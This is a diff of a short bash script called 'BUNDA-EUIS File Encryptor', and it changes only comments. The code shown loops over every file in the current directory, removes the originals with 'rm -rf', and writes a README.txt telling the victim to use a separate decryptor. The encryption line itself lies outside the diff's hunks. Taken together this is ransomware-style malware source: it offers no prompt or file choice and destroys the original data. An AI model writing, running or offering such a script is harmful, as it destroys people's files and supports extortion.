@@ -1,11 +1,7 @@
 #!/bin/bash
 # BUNDA-EUIS File Encryptor v.1
-# Created by Prima Setiawan / Joe Heartless
-
-# echo -n "[Insert password to protect files:] " # <-- Manual input password openssl -k
-# read passwed
-# echo -n "[File extension to encryp (ex: dat, xls, php, sql, '*' for all files in $(pwd)]: "
-# read ext
+# Created by Prima Setiawan / joeheartless
+#
 file=$(ls -f *.*)
 i=1
 for enc in $file 
@@ -15,7 +11,6 @@ do
 	file[i]=$enc
 	i=$(( i + 1 ))
 done
-# echo "Removing original file..."
 rm -rf $file
 echo "File encrypted, use Bunda-Euis-Decryptor to decrypt." > README.txt
 sleep 1
